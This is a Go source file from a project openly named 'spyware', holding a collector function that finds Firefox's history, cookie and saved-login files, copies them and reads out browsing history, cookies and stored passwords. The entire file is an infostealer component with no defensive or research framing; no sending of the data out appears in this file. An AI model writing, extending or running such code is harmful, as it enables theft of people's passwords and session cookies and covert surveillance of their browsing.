package collectors

import (
	"github.com/Nevesto/spyware/browsers/firefox"
	"github.com/Nevesto/spyware/models"
)

func CollectFirefoxInfo() models.FirefoxInfo {
	var info models.FirefoxInfo

	historyFile, err := firefox.FindHistoryFile()
	if err == nil && historyFile != "" {
		tmpHistoryFile, err := firefox.CopyFile(historyFile)
		if err == nil {
			info.History, _ = firefox.ReadHistory(tmpHistoryFile)
		}
	}

	cookieFile, err := firefox.FindCookieFile()
	if err == nil && cookieFile != "" {
		tmpCookieFile, err := firefox.CopyFile(cookieFile)
		if err == nil {
			info.Cookies, _ = firefox.ReadCookies(tmpCookieFile)
		}
	}

	loginFiles, err := firefox.FindLoginFiles()
	if err == nil && len(loginFiles) > 0 {
		info.Passwords, _ = firefox.ReadPasswords(loginFiles)
	}

	return info
}
